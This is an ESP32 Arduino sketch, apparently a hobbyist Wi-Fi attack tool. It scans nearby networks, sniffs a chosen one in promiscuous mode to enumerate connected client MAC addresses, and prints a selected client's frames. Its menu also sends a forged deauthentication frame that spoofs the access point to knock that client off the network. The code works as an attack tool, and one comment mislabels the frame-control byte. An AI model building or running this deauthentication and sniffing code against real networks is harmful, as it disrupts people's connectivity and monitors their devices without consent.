#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

#define MAX_DEVICES 50
#define MAX_NETWORKS 20


struct network {
  String ssid;
  String bssid;
  uint8_t bssidArr[6];
  int channel;
};


network scannedNetworks[MAX_NETWORKS];
int scannedCount = 0;

network selectedNetwork;

uint8_t receivers[MAX_DEVICES][6];
uint16_t packetCount[MAX_DEVICES];
volatile uint8_t deviceCount = 0;
uint8_t selectedClient[6];
bool clientSelected = false;


void scanNetworks() {
  Serial.println("\nScanning...");
  scannedCount = WiFi.scanNetworks(false, false);

  if (scannedCount == 0) {
    Serial.println("No networks found.");
    return;
  }

  Serial.println("--------------------------------------------------");
  Serial.printf("| %-3s | %-25s | %-17s | %-3s |\n",
                "#", "SSID", "BSSID", "CH");
  Serial.println("--------------------------------------------------");

  for (int i = 0; i < scannedCount && i < MAX_NETWORKS; i++) {

    scannedNetworks[i].ssid = WiFi.SSID(i);
    scannedNetworks[i].bssid = WiFi.BSSIDstr(i);
    scannedNetworks[i].channel = WiFi.channel(i);

    // Convert BSSID string to byte array
    sscanf(scannedNetworks[i].bssid.c_str(),
           "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &scannedNetworks[i].bssidArr[0],
           &scannedNetworks[i].bssidArr[1],
           &scannedNetworks[i].bssidArr[2],
           &scannedNetworks[i].bssidArr[3],
           &scannedNetworks[i].bssidArr[4],
           &scannedNetworks[i].bssidArr[5]);

    Serial.printf("| %-3d | %-25s | %-17s | %-3d |\n",
                  i + 1,scannedNetworks[i].ssid.c_str(),scannedNetworks[i].bssid.c_str(),scannedNetworks[i].channel);
  }

  Serial.println("--------------------------------------------------");
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *payload = pkt->payload;

    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];

    memcpy(addr1, payload + 4, 6);    
    memcpy(addr2, payload + 10, 6);  
    memcpy(addr3, payload + 16, 6);  

    bool belongsToAP =
        (memcmp(addr1, selectedNetwork.bssidArr, 6) == 0) ||
        (memcmp(addr2, selectedNetwork.bssidArr, 6) == 0) ||
        (memcmp(addr3, selectedNetwork.bssidArr, 6) == 0);

    if (!belongsToAP) return;
     uint8_t* clientMac = nullptr;
    if (memcmp(addr1, selectedNetwork.bssidArr, 6) == 0)
        clientMac = addr2;
    else if (memcmp(addr2, selectedNetwork.bssidArr, 6) == 0)
        clientMac = addr1;  
    else if (memcmp(addr3, selectedNetwork.bssidArr, 6) == 0)
        clientMac = addr2;  

  
if (clientMac == nullptr) return;

if (clientMac[0] == 0xFF)
    return;

if (clientMac[0] & 0x01)
    return;


if (memcmp(clientMac, selectedNetwork.bssidArr, 6) == 0)
    return;


    
    if (clientMac[0] == 0xFF) return;

    
    for (int i = 0; i < deviceCount; i++) {
        if (memcmp(receivers[i], clientMac, 6) == 0) {
            packetCount[i]++;
            return;
        }
    }

    
    if (deviceCount < MAX_DEVICES) {
        memcpy(receivers[deviceCount], clientMac, 6);
        packetCount[deviceCount] = 1;
        deviceCount++;
    }
}



void listDevices() {

  deviceCount = 0;
  memset(receivers, 0, sizeof(receivers));
  memset(packetCount, 0, sizeof(packetCount));

  Serial.printf("\nLocked to channel %d\n", selectedNetwork.channel);
  Serial.println("Sniffing for 30 seconds...");

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(selectedNetwork.channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_promiscuous(true);

  unsigned long start = millis();
  while (millis() - start < 30000) {
    delay(1);
  }

  esp_wifi_set_promiscuous(false);

  Serial.println("\n--- Connected Devices ---");

  if (deviceCount == 0) {
    Serial.println("No devices found.");
  } else {
    for (int i = 0; i < deviceCount; i++) {
    Serial.printf("[%d] %02X:%02X:%02X:%02X:%02X:%02X  | Packets: %d\n",
              i + 1,
              receivers[i][0], receivers[i][1],
              receivers[i][2], receivers[i][3],
              receivers[i][4], receivers[i][5],
              packetCount[i]);
    }
  }

  Serial.println("-------------------------\n");
}

void selectDevice() {

  if (deviceCount == 0) {
    Serial.println("No devices to select.");
    return;
  }

  Serial.println("Enter device number to monitor (0 to skip):");

  while (Serial.available() == 0) {
    delay(10);
  }

  int choice = Serial.parseInt();
  Serial.read();  // clear newline

  if (choice == 0) {
    Serial.println("Skipping selection.");
    return;
  }

  if (choice < 1 || choice > deviceCount) {
    Serial.println("Invalid selection.");
    return;
  }

  memcpy(selectedClient, receivers[choice - 1], 6);
  clientSelected = true;

  Serial.print("Now monitoring: ");
  Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
                selectedClient[0], selectedClient[1],
                selectedClient[2], selectedClient[3],
                selectedClient[4], selectedClient[5]);
}
void startLiveMonitor() {

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(selectedNetwork.channel, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {

    if (type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *payload = pkt->payload;

    uint8_t addr1[6];
    uint8_t addr2[6];

    memcpy(addr1, payload + 4, 6);
    memcpy(addr2, payload + 10, 6);

    if (memcmp(addr1, selectedClient, 6) == 0 ||
        memcmp(addr2, selectedClient, 6) == 0) {

      Serial.printf("Frame | SRC: %02X:%02X:%02X:%02X:%02X:%02X | ",
                    addr2[0], addr2[1], addr2[2],
                    addr2[3], addr2[4], addr2[5]);

      Serial.printf("DST: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    addr1[0], addr1[1], addr1[2],
                    addr1[3], addr1[4], addr1[5]);
    }

  });

  esp_wifi_set_promiscuous(true);

  Serial.println("Press any key to stop...");

  while (Serial.available() == 0) {
    delay(10);
  }

  Serial.read(); // clear input
  esp_wifi_set_promiscuous(false);
  Serial.println("Stopped monitoring.");
}

void setup() {
  Serial.begin(115200);
  Serial.setTimeout(10000);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  esp_wifi_set_promiscuous(false);

  Serial.println("\nESP32 WiFi Sniffer Ready");
}


void sendDeauthPacket()
{
  struct
  {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t sequence_control[2];
    uint8_t reason_code[2];
  } __attribute__((packed)) deauth_frame;

  deauth_frame.frame_control[0] = 0xC0;  // To DS + From DS + Deauth Frame
  deauth_frame.frame_control[1] = 0x00;
  deauth_frame.duration[0] = 0x00;
  deauth_frame.duration[1] = 0x00;
  memcpy(deauth_frame.addr1, selectedClient, 6);    // STA address
  memcpy(deauth_frame.addr2, selectedNetwork.bssidArr, 6);  // AP address
  memcpy(deauth_frame.addr3, selectedNetwork.bssidArr, 6);  // AP address
  deauth_frame.sequence_control[0] = 0x00;
  deauth_frame.sequence_control[1] = 0x00;
  deauth_frame.reason_code[0] = 0x01;  // Reason: Unspecified reason
  deauth_frame.reason_code[1] = 0x00;

   esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
}


void monitorMenu() {

  if (!clientSelected) {
    Serial.println("No client selected.");
    return;
  }

  Serial.println("\nMonitor Options:");
  Serial.println("1 - Print frames for this device");
  Serial.println("2 - Send Deauth Packet");
  Serial.println("0 - Exit");

  while (Serial.available() == 0) {
    delay(10);
  }

  int option = Serial.parseInt();
  Serial.read(); // clear newline

  switch (option) {

    case 1:
      Serial.println("Starting live frame print...");
      startLiveMonitor();
      break;

    case 2:
      Serial.println("send Deauth Packet Selected");
      sendDeauthPacket();
      break;

    case 0:
      Serial.println("Exiting monitor menu.");
      break;

    default:
      Serial.println("Invalid option.");
      break;
  }
}

void loop() {

  scanNetworks();

  Serial.println("Enter network number (0 to rescan):");

  while (Serial.available() == 0) {
    delay(10);
  }

  int n = Serial.parseInt();
  Serial.read(); // clear newline

  if (n <= 0 || n > scannedCount) {
    Serial.println("Invalid selection.\n");
    delay(1000);
    return;
  }

  int index = n - 1;

  selectedNetwork = scannedNetworks[index];

  Serial.printf("\nSelected: %s\n", selectedNetwork.ssid.c_str());

  listDevices();
  selectDevice();

  if (clientSelected) {
   monitorMenu();
  }   
  delay(3000);
}
